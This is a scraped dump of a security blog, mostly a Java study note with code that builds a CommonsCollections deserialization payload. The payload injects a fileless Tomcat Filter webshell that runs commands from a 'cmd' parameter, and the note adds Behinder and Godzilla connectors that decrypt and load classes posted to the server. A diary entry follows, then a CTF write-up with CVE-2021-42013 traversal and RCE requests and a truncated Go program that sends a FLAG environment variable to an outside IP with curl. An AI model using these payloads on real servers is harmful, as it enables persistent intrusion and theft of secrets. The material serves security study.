Filterå†…å­˜é©¬éƒ¨åˆ†å•ç‹¬å†™ä¸€ä»½TomcatInject.javaæ–‡ä»¶ï¼Œæ›¿æ¢æ‰è¿™é‡Œçš„getBytescodeï¼Œè®©å®ƒä¸è¦è‡ªå·±ç”Ÿæˆæ¶æ„ç±»äº†ï¼Œç›´æ¥è¯»å–TomcatInject.classçš„å­—èŠ‚ç å³å¯\npackage ccTest; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.HashSet; @SuppressWarnings(\u0026#34;all\u0026#34;) public class CC11Template { public static void main(String[] args) throws Exception { byte[] bytes = getBytes(); byte[][] targetByteCodes = new byte[][]{bytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); Field f0 = templates.getClass().getDeclaredField(\u0026#34;_bytecodes\u0026#34;); f0.setAccessible(true); f0.set(templates,targetByteCodes); f0 = templates.getClass().getDeclaredField(\u0026#34;_name\u0026#34;); f0.setAccessible(true); f0.set(templates,\u0026#34;name\u0026#34;); f0 = templates.getClass().getDeclaredField(\u0026#34;_class\u0026#34;); f0.setAccessible(true); f0.set(templates,null); // åˆ©ç”¨åå°„è°ƒç”¨ templates ä¸­çš„ newTransformer æ–¹æ³• InvokerTransformer transformer = new InvokerTransformer(\u0026#34;asdfasdfasdf\u0026#34;, new Class[0], new Object[0]); HashMap innermap = new HashMap(); LazyMap map = (LazyMap)LazyMap.decorate(innermap,transformer); TiedMapEntry tiedmap = new TiedMapEntry(map,templates); HashSet hashset = new HashSet(1); hashset.add(\u0026#34;foo\u0026#34;); // æˆ‘ä»¬è¦è®¾ç½® HashSet çš„ map ä¸ºæˆ‘ä»¬çš„ HashMap Field f = null; try { f = HashSet.class.getDeclaredField(\u0026#34;map\u0026#34;); } catch (NoSuchFieldException e) { f = HashSet.class.getDeclaredField(\u0026#34;backingMap\u0026#34;); } f.setAccessible(true); HashMap hashset_map = (HashMap) f.get(hashset); Field f2 = null; try { f2 = HashMap.class.getDeclaredField(\u0026#34;table\u0026#34;); } catch (NoSuchFieldException e) { f2 = HashMap.class.getDeclaredField(\u0026#34;elementData\u0026#34;); } f2.setAccessible(true); Object[] array = (Object[])f2.get(hashset_map); Object node = array[0]; if(node == null){ node = array[1]; } Field keyField = null; try{ keyField = node.getClass().getDeclaredField(\u0026#34;key\u0026#34;); }catch(Exception e){ keyField = Class.forName(\u0026#34;java.util.MapEntry\u0026#34;).getDeclaredField(\u0026#34;key\u0026#34;); } keyField.setAccessible(true); keyField.set(node,tiedmap); // åœ¨ invoke ä¹‹åï¼Œ Field f3 = transformer.getClass().getDeclaredField(\u0026#34;iMethodName\u0026#34;); f3.setAccessible(true); f3.set(transformer,\u0026#34;newTransformer\u0026#34;); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;./cc11Test4.ser\u0026#34;)); outputStream.writeObject(hashset); outputStream.close(); }catch(Exception e){ e.printStackTrace(); } } public static byte[] getBytes() throws IOException { InputStream inputStream = new FileInputStream(new File(\u0026#34;E:\\\\JavaStudy\\\\test05\\\\target\\\\classes\\\\ccTest\\\\TomcatInject.class\u0026#34;)); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); int n = 0; while ((n=inputStream.read())!=-1){ byteArrayOutputStream.write(n); } byte[] bytes = byteArrayOutputStream.toByteArray(); return bytes; } } æœ‰äº†è¿™ä¸ªCC11çš„æ¨¡æ¿ï¼Œå‰©ä¸‹çš„å°±æ˜¯æ³¨å…¥å†…å­˜é©¬éƒ¨åˆ†äº†ï¼Œè¯¦ç»†åˆ†æå¯ä»¥å‚è§ä¸‰æ¢¦å¸ˆå‚…çš„åŸºäºtomcatçš„å†…å­˜ Webshell æ— æ–‡ä»¶æ”»å‡»æŠ€æœ¯ï¼ˆå¤ªå¼ºäº†å¤ªå¼ºäº†ï¼‰ï¼Œä»£ç å¦‚ä¸‹ï¼ˆæœ‰ç¨ä½œä¿®æ”¹ï¼‰\npackage ccTest; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import org.apache.catalina.LifecycleState; import org.apache.catalina.core.ApplicationContext; import org.apache.catalina.core.StandardContext; import java.io.IOException; import java.lang.reflect.Field; import java.lang.reflect.Method; import java.lang.reflect.Modifier; import javax.servlet.Filter; import javax.servlet.FilterChain; import javax.servlet.FilterConfig; import javax.servlet.ServletContext; import javax.servlet.ServletException; import javax.servlet.ServletRequest; import javax.servlet.ServletResponse; public class TomcatInject extends AbstractTranslet implements Filter { private final String cmdParamName = \u0026#34;cmd\u0026#34;; private final static String filterUrlPattern = \u0026#34;/*\u0026#34;; private final static String filterName = \u0026#34;amiz\u0026#34;; static { try { // åå°„ä¿®æ”¹WRAP_SAME_OBJECTå€¼ä¸ºtrue Class c = Class.forName(\u0026#34;org.apache.catalina.core.ApplicationDispatcher\u0026#34;); java.lang.reflect.Field f = c.getDeclaredField(\u0026#34;WRAP_SAME_OBJECT\u0026#34;); java.lang.reflect.Field modifiersField = f.getClass().getDeclaredField(\u0026#34;modifiers\u0026#34;); // è·å–modifierså­—æ®µ modifiersField.setAccessible(true); //å°†å˜é‡è®¾ç½®ä¸ºå¯è®¿é—® modifiersField.setInt(f, f.getModifiers() \u0026amp; ~Modifier.FINAL); // å–æ¶ˆFINALå±æ€§ f.setAccessible(true); // å°†å˜é‡è®¾ç½®ä¸ºå¯è®¿é—® if (!f.getBoolean(null)) { f.setBoolean(null, true); // å°†å˜é‡è®¾ç½®ä¸ºtrue } // åˆå§‹åŒ–lastServicedRequest c = Class.forName(\u0026#34;org.apache.catalina.core.ApplicationFilterChain\u0026#34;); f = c.getDeclaredField(\u0026#34;lastServicedRequest\u0026#34;); modifiersField = f.getClass().getDeclaredField(\u0026#34;modifiers\u0026#34;); modifiersField.setAccessible(true); modifiersField.setInt(f, f.getModifiers() \u0026amp; ~java.lang.reflect.Modifier.FINAL); f.setAccessible(true); if (f.get(null) == null) { f.set(null, new ThreadLocal()); //è®¾ç½®ThreadLocalå¯¹è±¡ } // åˆå§‹åŒ–lastServicedResponse f = c.getDeclaredField(\u0026#34;lastServicedResponse\u0026#34;); modifiersField = f.getClass().getDeclaredField(\u0026#34;modifiers\u0026#34;); modifiersField.setAccessible(true); modifiersField.setInt(f, f.getModifiers() \u0026amp; ~java.lang.reflect.Modifier.FINAL); f.setAccessible(true); if (f.get(null) == null) { f.set(null, new ThreadLocal()); // è®¾ç½®ThreadLocalå¯¹è±¡ } // è·å–ä¸Šä¸‹æ–‡StandardContext ServletContext servletContext = getServletContext(); if (servletContext != null){ Field ctx = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); ctx.setAccessible(true); ApplicationContext appctx = (ApplicationContext) ctx.get(servletContext); Field stdctx = appctx.getClass().getDeclaredField(\u0026#34;context\u0026#34;); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(appctx); if (standardContext != null){ // è¿™æ ·è®¾ç½®ä¸ä¼šæŠ›å‡ºæŠ¥é”™ Field stateField = org.apache.catalina.util.LifecycleBase.class .getDeclaredField(\u0026#34;state\u0026#34;); stateField.setAccessible(true); stateField.set(standardContext, LifecycleState.STARTING_PREP); Filter myFilter =new TomcatInject(); // è°ƒç”¨doFilteræ¥åŠ¨æ€æ·»åŠ Filter ä¹Ÿå¯ä»¥åˆ©ç”¨åå°„ javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext.addFilter(filterName,myFilter); // è¿›è¡Œä¸€äº›ç®€å•çš„è®¾ç½® filterRegistration.setInitParameter(\u0026#34;encoding\u0026#34;, \u0026#34;utf-8\u0026#34;); filterRegistration.setAsyncSupported(false); // è®¾ç½®åŸºæœ¬çš„ url pattern filterRegistration .addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false, new String[]{\u0026#34;/*\u0026#34;}); // å°†æœåŠ¡é‡æ–°ä¿®æ”¹å›æ¥ï¼Œä¸ç„¶çš„è¯æœåŠ¡ä¼šæ— æ³•æ­£å¸¸è¿›è¡Œ if (stateField != null){ stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED); } // è®¾ç½®å¥½ä¹‹åè°ƒç”¨filterstartæ¥å¯åŠ¨æˆ‘ä»¬çš„ filter if (standardContext != null){ Method filterStartMethod = StandardContext.class.getDeclaredMethod(\u0026#34;filterStart\u0026#34;); filterStartMethod.setAccessible(true); filterStartMethod.invoke(standardContext,null); // æŠŠfilteræ’åˆ°ç¬¬ä¸€ä½ Class ccc = null; try { ccc = Class.forName(\u0026#34;org.apache.tomcat.util.descriptor.web.FilterMap\u0026#34;); } catch (Throwable t){} if (ccc == null) { try { ccc = Class.forName(\u0026#34;org.apache.catalina.deploy.FilterMap\u0026#34;); } catch (Throwable t){} } Method m = Class.forName(\u0026#34;org.apache.catalina.core.StandardContext\u0026#34;) .getDeclaredMethod(\u0026#34;findFilterMaps\u0026#34;); Object[] filterMaps = (Object[]) m.invoke(standardContext); Object[] tmpFilterMaps = new Object[filterMaps.length]; int index = 1; for (int i = 0; i \u0026lt; filterMaps.length; i++) { Object o = filterMaps[i]; m = ccc.getMethod(\u0026#34;getFilterName\u0026#34;); String name = (String) m.invoke(o); if (name.equalsIgnoreCase(filterName)) { tmpFilterMaps[0] = o; } else { tmpFilterMaps[index++] = filterMaps[i]; } } for (int i = 0; i \u0026lt; filterMaps.length; i++) { filterMaps[i] = tmpFilterMaps[i]; } } } } } catch (Exception e) { // e.printStackTrace(); } } private static ServletContext getServletContext() throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException { ServletRequest servletRequest = null; Class c = Class.forName(\u0026#34;org.apache.catalina.core.ApplicationFilterChain\u0026#34;); java.lang.reflect.Field f = c.getDeclaredField(\u0026#34;lastServicedRequest\u0026#34;); f.setAccessible(true); ThreadLocal threadLocal = (ThreadLocal) f.get(null); if (threadLocal != null \u0026amp;\u0026amp; threadLocal.get() != null) { servletRequest = (ServletRequest) threadLocal.get(); // è¯æ˜å‰åŠéƒ¨åˆ†æˆåŠŸ } // å¦‚æœå¤±è´¥åˆ™æ¢å…¶ä»–æ–¹å¼ // springè·å–æ³•1 if (servletRequest == null) { try { c = Class.forName(\u0026#34;org.springframework.web.context.request.RequestContextHolder\u0026#34;); Method m = c.getMethod(\u0026#34;getRequestAttributes\u0026#34;); Object o = m.invoke(null); c = Class.forName(\u0026#34;org.springframework.web.context.request.ServletRequestAttributes\u0026#34;); m = c.getMethod(\u0026#34;getRequest\u0026#34;); servletRequest = (ServletRequest) m.invoke(o); } catch (Throwable t) {} } if (servletRequest != null) return servletRequest.getServletContext(); // springè·å–æ³•2 try { c = Class.forName(\u0026#34;org.springframework.web.context.ContextLoader\u0026#34;); Method m = c.getMethod(\u0026#34;getCurrentWebApplicationContext\u0026#34;); Object o = m.invoke(null); c = Class.forName(\u0026#34;org.springframework.web.context.WebApplicationContext\u0026#34;); m = c.getMethod(\u0026#34;getServletContext\u0026#34;); ServletContext servletContext = (ServletContext) m.invoke(o); return servletContext; } catch (Throwable t) {} return null; } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } @Override public void init(FilterConfig filterConfig) throws ServletException { } @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { // System.out.println(\u0026#34;TomcatShellInject doFilter..........\u0026#34;); String cmd; if ((cmd = servletRequest.getParameter(cmdParamName)) != null) { Process process = Runtime.getRuntime().exec(cmd); java.io.BufferedReader bufferedReader = new java.io.BufferedReader( new java.io.InputStreamReader(process.getInputStream())); StringBuilder stringBuilder = new StringBuilder(); String line; while ((line = bufferedReader.readLine()) != null) { stringBuilder.append(line + \u0026#39;\\n\u0026#39;); } servletResponse.getOutputStream().write(stringBuilder.toString().getBytes()); servletResponse.getOutputStream().flush(); servletResponse.getOutputStream().close(); return; } filterChain.doFilter(servletRequest, servletResponse); } @Override public void destroy() { } } æ¥å…¥å†°è åªéœ€è¦åœ¨æˆ‘ä»¬é‡å†™çš„doFilteréƒ¨åˆ†å¤šåŠ ä¸€ä¸ªifæ¥é€‚é…å†°èæµé‡çš„é€»è¾‘å³å¯æ¥å…¥å†°èï¼Œä»£ç éƒ¨åˆ†è¯¦ç»†åˆ†æå‚è§Y4erå¸ˆå‚…çš„Javaååºåˆ—åŒ–æ³¨å…¥å†°èå†…å­˜é©¬ç›¸å…³è¸©å‘ç¬”è®°\n// omit else { HttpServletRequest request = (HttpServletRequest) servletRequest; HttpServletResponse response = (HttpServletResponse) servletResponse; HttpSession session = request.getSession(); // create pageContext HashMap pageContext = new HashMap(); pageContext.put(\u0026#34;request\u0026#34;, request); pageContext.put(\u0026#34;response\u0026#34;, response); pageContext.put(\u0026#34;session\u0026#34;, session); if(request.getMethod().equals(\u0026#34;POST\u0026#34;)){ // è¿™é‡Œçš„åˆ¤æ–­æ¡ä»¶å¯è‡ªè¡Œä¿®æ”¹ if(request.getHeader(\u0026#34;Referer\u0026#34;).equalsIgnoreCase(\u0026#34;https://www.baidu.com/\u0026#34;)){ try{ String k = \u0026#34;e45e329feb5d925b\u0026#34;;\t// default: pass=beyond, k=md5(pass)[:16] session.putValue(\u0026#34;u\u0026#34;, k); Cipher c = Cipher.getInstance(\u0026#34;AES\u0026#34;); c.init(2, new SecretKeySpec(k.getBytes(), \u0026#34;AES\u0026#34;)); Method method = Class.forName(\u0026#34;java.lang.ClassLoader\u0026#34;).getDeclaredMethod(\u0026#34;defineClass\u0026#34;, byte[].class, int.class, int.class); method.setAccessible(true); byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine())); Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte, 0, evilclass_byte.length); evilclass.newInstance().equals(pageContext); return; }catch (Exception e){ // e.printStackTrace(); } } } } å†™ä¸€ä¸ªååºåˆ—åŒ–æ¥å£æ¥æµ‹è¯•ä¸€ä¸‹æ•ˆæœ\nimport javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.*; @WebServlet(\u0026#34;/cc\u0026#34;) public class CCServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { InputStream inputStream = (InputStream) req; ObjectInputStream objectInputStream = new ObjectInputStream(inputStream); try { objectInputStream.readObject(); } catch (ClassNotFoundException e) { e.printStackTrace(); } resp.getWriter().write(\u0026#34;Success\u0026#34;); } @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { InputStream inputStream = req.getInputStream(); ObjectInputStream objectInputStream = new ObjectInputStream(inputStream); try { objectInputStream.readObject(); } catch (ClassNotFoundException e) { e.printStackTrace(); } resp.getWriter().write(\u0026#34;Success\u0026#34;); } } å…ˆç¼–è¯‘TomcatInject.javaï¼Œå†è¿è¡ŒCC11Templateï¼Œç”Ÿæˆçš„seræ–‡ä»¶å°±æ˜¯æœ€ç»ˆpayload\n# è™½ç„¶æˆ‘æŠŠä¸‰æ¢¦å¸ˆå‚…çš„TomcatEchoå’ŒTomcatInjectå’Œåœ¨ä¸€èµ·äº† ä½†æ³¨æ„æ•°æ®åŒ…ä»ç„¶éœ€è¦å‘é€ä¸¤æ¬¡ curl \u0026#34;http://127.0.0.1:8088/cc\u0026#34; --data-binary \u0026#34;@./cc11Test4.ser\u0026#34; æ¥å…¥å“¥æ–¯æ‹‰ å“¥æ–¯æ‹‰çš„æµé‡æ¯”å†°èçš„ç®€å•å¤šäº†ï¼ŒåŠ å¯†å†…å®¹åœ¨å‚æ•°passä¸­ ä»¥postæ–¹å¼å‘å‡ºï¼Œè¯¦ç»†åˆ†æå‚è§Y4erå¸ˆå‚…çš„è§£å†³å“¥æ–¯æ‹‰å†…å­˜é©¬pagecontextçš„é—®é¢˜\nç»§ç»­èå…¥æˆ‘ä»¬åŸæœ¬çš„filterï¼Œä»£ç å¦‚ä¸‹\n// omit else if(request.getHeader(\u0026#34;Referer\u0026#34;).equalsIgnoreCase(\u0026#34;https://www.sohu.com/\u0026#34;)){ try { // default: pass=pass, key=key, xc=md5(key)[:16] String pass = \u0026#34;pass\u0026#34;; String xc = \u0026#34;3c6e0b8a9c15224a\u0026#34;; String md5 = md5(pass + xc); System.out.println(\u0026#34;here\u0026#34;); byte[] data = base64Decode(request.getParameter(pass)); data = x(data, false, xc); if(this.payload == null){\t// åœ¨ç±»ä¸­æå‰å£°æ˜ `Class payload;` URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader()); Method defMethod = ClassLoader.class.getDeclaredMethod(\u0026#34;defineClass\u0026#34;, byte[].class, Integer.TYPE, Integer.TYPE); defMethod.setAccessible(true); this.payload = (Class)defMethod.invoke(urlClassLoader, data, 0, data.length); }else { ByteArrayOutputStream arrOut = new ByteArrayOutputStream(); Object f = this.payload.newInstance(); f.equals(arrOut); f.equals(data); f.equals(request); response.getWriter().write(md5.substring(0, 16)); f.toString(); response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true, xc))); response.getWriter().write(md5.substring(16)); } return; }catch (Exception e){ e.printStackTrace(); } } æ¶‰åŠåˆ°çš„å‡ ä¸ªç¼–ç å·¥å…·æ–¹æ³•\npublic static byte[] base64Decode(String bs) throws Exception { byte[] value = null; Class base64; try { base64 = Class.forName(\u0026#34;java.util.Base64\u0026#34;); Object decoder = base64.getMethod(\u0026#34;getDecoder\u0026#34;, (Class[])null).invoke(base64, (Object[])null); value = (byte[])((byte[])decoder.getClass().getMethod(\u0026#34;decode\u0026#34;, String.class).invoke(decoder, bs)); } catch (Exception var6) { try { base64 = Class.forName(\u0026#34;sun.misc.BASE64Decoder\u0026#34;); Object decoder = base64.newInstance(); value = (byte[])((byte[])decoder.getClass().getMethod(\u0026#34;decodeBuffer\u0026#34;, String.class).invoke(decoder, bs)); } catch (Exception e) { e.printStackTrace(); } } return value; } public static String base64Encode(byte[] bs) throws Exception { String value = null; Class base64; try { base64 = Class.forName(\u0026#34;java.util.Base64\u0026#34;); Object Encoder = base64.getMethod(\u0026#34;getEncoder\u0026#34;, (Class[])null).invoke(base64, (Object[])null); value = (String)Encoder.getClass().getMethod(\u0026#34;encodeToString\u0026#34;, byte[].class).invoke(Encoder, bs); } catch (Exception var6) { try { base64 = Class.forName(\u0026#34;sun.misc.BASE64Encoder\u0026#34;); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod(\u0026#34;encode\u0026#34;, byte[].class).invoke(Encoder, bs); } catch (Exception e) { e.printStackTrace(); } } return value; } public static String md5(String s) { String ret = null; try { MessageDigest m = MessageDigest.getInstance(\u0026#34;MD5\u0026#34;); m.update(s.getBytes(), 0, s.length()); ret = (new BigInteger(1, m.digest())).toString(16).toUpperCase(); } catch (Exception e) { e.printStackTrace(); } return ret; } public byte[] x(byte[] s, boolean m, String xc) { try { Cipher c = Cipher.getInstance(\u0026#34;AES\u0026#34;); c.init(m ? 1 : 2, new SecretKeySpec(xc.getBytes(), \u0026#34;AES\u0026#34;)); return c.doFinal(s); } catch (Exception e) { return null; } } æµ‹è¯•æ•ˆæœ\næˆåŠŸè¾¾åˆ°é¢„æœŸæ•ˆæœ\næ³¨æ„ æˆ‘ä»¬é€šè¿‡ååºåˆ—åŒ–æ¥å…¥çš„å†°èå’Œå“¥æ–¯æ‹‰æ˜¯ä½œä¸ºæ·»åŠ çš„Filterçš„ä¸€éƒ¨åˆ†ï¼Œæ‰€ä»¥ä¸€æ—¦Filterè¢«killäº†ï¼Œå†°èå’Œå“¥æ–¯æ‹‰ä¹Ÿå°†ä¼šè¿ä¸ä¸Š\nx\nä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æ¥ğŸ”— æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ éƒ½0202å¹´äº†è€å—¨è¿˜åœ¨ç”¨çš„ - å„ç§å§¿åŠ¿jsp webshell\nJAVAå†…å­˜é©¬çš„â€œä¸€ç”Ÿâ€\nTomcatå®¹å™¨æ”»é˜²ç¬”è®°ä¹‹JSPé‡‘è‰è„±å£³\nJavaååºåˆ—åŒ–æ³¨å…¥å†°èå†…å­˜é©¬ç›¸å…³è¸©å‘ç¬”è®°\nè§£å†³å“¥æ–¯æ‹‰å†…å­˜é©¬pagecontextçš„é—®é¢˜\n","date":"2022-05-30T23:20:41+08:00","permalink":"https://amiaaaz.github.io/2022/05/30/java-study-notes-05/","section":"posts","tags":["Java"],"title":"Javaå­¦ä¹ ç¬”è®°â…¤"},{"categories":[],"contents":"è™½è¯´â€œä¸€ä¸‰äº”ä¸ƒå…«åè…Šï¼Œä¸‰åä¸€å¤©æ°¸ä¸å·®â€ï¼Œä½†è¿˜æ˜¯æƒ³æå‰æŠŠ5æœˆçš„æµæ°´è´¦å°ç»“å†™æ‰\näº”ä¸€å¿«ä¹ç©·æ¸¸ï¼ŒçœŸ Â· ä¸Šå±±ä¸‹æ²³ï¼Œå¾ˆå¼€å¿ƒï¼›å¦‚æœèƒ½åœ¨æ‘é‡Œç½®ä¸ªå®…é™¢ä¹Ÿæ˜¯å¾ˆä¸é”™çš„ï¼Œdreamä¸€ä¸‹\néšåå°±æ˜¯ä¸¤å‘¨çš„æ•™è‚²hvväº†ï¼Œæ²¡å•¥å¥½è¯´çš„ï¼Œæ‡‚å¾—éƒ½æ‡‚ï¼Œä¸æ‡‚çš„ä¹Ÿå°±ä¸æ‡‚äº†ï¼›æ€»ä¹‹è¿˜ä¸é”™ï¼Œæ¯”ä¹‹å‰è¿›æ­¥å¾ˆå¤šï¼Œç®—æ˜¯æŠŠhvvä»¥åŠæ¸—é€æµ‹è¯•çš„èµ·æ‰‹å¼ç»™å¤§è‡´æ‘¸æ˜ç™½äº†ï¼Œéœ€è¦çš„æŠ€èƒ½æ ˆä¹Ÿéƒ½æœ€èµ·ç çŸ¥é“äº†åå­—å’Œæ€è·¯ï¼Œä½†è¿˜æ˜¯ç¦»é‚£äº›å¸¦ä½¬ä»¬å·®çš„éå¸¸éå¸¸éå¸¸éå¸¸è¿œï¼Œé«˜æƒ…å•†ï¼šè¿›æ­¥ç©ºé—´å¤ªå¤§äº†\nhvvç»“æŸä»¥åæŠŠJavaå®‰å…¨ç»§ç»­æ¡èµ·æ¥äº†ï¼ŒæŠŠä¹‹å‰å›«å›µåæ£ç•¥è¿‡çš„åœ°æ–¹åŠ å›ºäº†ä¸€ä¸‹ï¼Œä¹Ÿæé«˜äº†ä¸€ç‚¹ç‚¹ç»“æ„åŒ–æ€ç»´ï¼Œå¸Œæœ›èƒ½å†æå‡ä¸€äº›ä»£ç å®¡è®¡çš„èƒ½åŠ›ï¼Œç°åœ¨çœ‹åˆ°å¤ªé•¿çš„åŠŸèƒ½æ€§ä»£ç è¿˜æ˜¯ä¸‹æ„è¯†ä¼šè·³è¿‡â€¦â€¦çœŸçš„æ˜¯æ¶ä¹ å•Šï¼ï¼ï¼å¦‚æœä¸èƒ½ä»ä¸šåŠ¡å®ç°çš„è§’åº¦æ¥åˆ†æå®‰å…¨æ¼æ´ï¼Œé‚£æ³¨å®šå­˜åœ¨ä¸€å—å±é™©çš„çŸ­æ¿\nCTFå€’æ˜¯è½ä¸‹äº†ï¼Œæ²¡æœ‰åšæŒä¹‹å‰åˆ·ctftimeçš„ç›®æ ‡ï¼Œemmmï¼Œåœ¨åŠªåŠ›è¡¥èµ·æ¥äº†\nä¸è¿‡æŠŠå¦ä¸€ä¸ªå¥½ä¹ æƒ¯æ¥ç€åŸ¹å…»èµ·æ¥äº†â€”â€”æ¯å¤©åšæŒçœ‹ä¸€äº›å®‰å…¨ç›¸å…³çš„æ¨æ–‡ï¼Œå­˜ç¦»çº¿çš„cheatSheetåœ¨æ‰‹æœºä¸Šè§£å†³ç¢ç‰‡æ—¶é—´ï¼ˆè™½ç„¶ç†è®ºä¸Šå±…å®¶ä¸å­˜åœ¨ç¢ç‰‡æ—¶é—´å°±æ˜¯äº†ï¼‰ï¼Œçœ‹é¢ç»å·©å›ºæ‰€å­¦çš„çŸ¥è¯†ï¼›å¸Œæœ›è¿™ä¸ªä¹ æƒ¯èƒ½ä¸€ç›´æŒç»­ä¸‹å»ï¼Œæ—¥ç§¯è·¬æ­¥å§\n*6æœˆå¸Œæœ›è¡¥é½çš„çŸ­æ¿ï¼šä»£ç å®¡è®¡èƒ½åŠ›ï¼Œå·¥å…·ç¼–å†™èƒ½åŠ›ï¼Œè½ä¸‹çš„CTF web\nå¾ˆéš¾ä»¥ç½®ä¿¡çš„æ˜¯ç«Ÿç„¶å·²ç»è¦6æœˆäº†ï¼Œ5å¹´å‰çš„6æœˆæˆ‘åœ¨è‚ç¢§è“èˆªçº¿ï¼Œå‰å¹´çš„6æœˆæˆ‘æå‰å›å®¶æ‘†çƒ‚é«˜è€ƒï¼Œå»å¹´çš„6æœˆåœ¨buuåˆ·buuï¼Œä»Šå¹´çš„6æœˆâ€¦â€¦ä¼¼ä¹æ¯å¹´çš„å‰åŠå¹´æˆ‘éƒ½ä¼šæ‘†è¿‡å»ï¼Œå¯æ˜¯äººç”Ÿè‹¦çŸ­ï¼Œå“ªæœ‰é‚£ä¹ˆå¤šæ—¶é—´è®©ä½ æ‘†è¿‡å»å‘¢ï¼Ÿä¿æŒå†·é™å’Œæ¸…é†’å§ï¼Œä¸è¦å†æƒ…ç»ªåŒ–äº†\nç»å¸¸çœ‹åˆ°å¾ˆå¤šå¸ˆå‚…çš„åšå®¢ä¸­éƒ½æœ‰ä¸€å¥è¯ï¼Œå¤§è‡´æ˜¯ï¼šâ€œæœ‰æŠ€æœ¯è¿½æ±‚çš„äººåº”è¯¥å»æŒ‘æˆ˜é‚£äº›å´‡å±±å³»å²­â€ï¼›èµ·åˆçœ‹åˆ°ä¸ä»¥ä¸ºæ„ï¼Œå¯æ˜¯åœ¨ç»è¿‡äº†ä¸€äº›äº‹æƒ…ä¹‹åï¼Œåˆæœ‰äº†â€œçœ‹å±±è¿˜æ˜¯å±±â€çš„æ„Ÿæ‚Ÿã€‚æ—¢ç„¶é€‰æ‹©äº†ä½ æ‰€çƒ­çˆ±çš„ï¼Œé‚£å°±åšæŒä¸‹å»ï¼ŒåšæŒä¸‹å»å§\næœ€åï¼Œæ‘˜ä¸€äº›éœ‰å¥³å£«NYUæ¼”è®²ä¸­çš„å¥å­\nA lot of the time, when we lose things, we gain things too.\nI leave you with this: We are led by our gut instincts, our intuition, our desires and fears, our scars and our dreams. And you will screw it up sometimes. So will I. And when I do, you will most likely read about on the internet. Anyway\u0026hellip; hard things will happen to us. We will recover. We will learn from it. We will grow more resilient because of it.\nScary news is: You\u0026rsquo;re on your own now. Cool news is: You\u0026rsquo;re on your own now.\n","date":"2022-05-29T00:53:39+08:00","permalink":"https://amiaaaz.github.io/life/0522-diary/","section":"life","tags":[],"title":"0522æµæ°´è´¦"},{"categories":["LTS","NOTES\u0026SUMMARY"],"contents":"ret=127\nret=127\nret=127\nret=127\nret=127\nret=127\nret=127\n","date":"2022-05-24T17:42:07+08:00","permalink":"https://amiaaaz.github.io/2022/05/24/common-vulns-summary/","section":"posts","tags":[],"title":"å…³äºå¸¸è§æ¼æ´ç‚¹çš„æ€è€ƒ"},{"categories":["CTF"],"contents":"Power Cookie GET /check cookie: admin=1 é­”æ³•æµè§ˆå™¨ æ§åˆ¶å°ç»™å‡ºéœ€è¦ç”¨çš„UAå¤´\nGET / User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Magic/100.0.4896.75 getme é¡µé¢æç¤ºpwd=/usr/local/apache2/\nå°è¯•å‡ ä¸ªgetå‚æ•°ï¼Œæ— \nå°è¯•é…ç½®æ–‡ä»¶/user/local/apache2/conf/httpd.confï¼Œè®¿é—®ä¸åˆ°\næ³¨æ„åˆ°apacheç‰ˆæœ¬2.4.50 å°è¯•CVE-2021-42013è·¯å¾„ç©¿è¶Š\nGET /icons/.%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/flag æ˜¯fake flagï¼Œé‚£ç›´æ¥rce\nPOST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh echo;ls /diajgk/djflgak/qweqr/eigopl å¾—åˆ°flagçš„çœŸå®è·¯å¾„ï¼Œå†è®¿é—®\nGET /icons/.%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/diajgk/djflgak/qweqr/eigopl/fffffflalllallalagggggggggg hackme /uploadä¸Šä¼ goæºæ–‡ä»¶å’Œç¼–è¯‘å¥½çš„elfæ–‡ä»¶\npackage main import ( \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;os/exec\u0026#34; \u0026#34;os\u0026#34; ) func main() { ttt := os.Getenv(\u0026#34;FLAG\u0026#34;) cmd := exec.Command(\u0026#34;curl\u0026#34;, \u0026#34;101.35.114.107:8426\u0026#34;, \u0026#34;-d\u0026#34;, 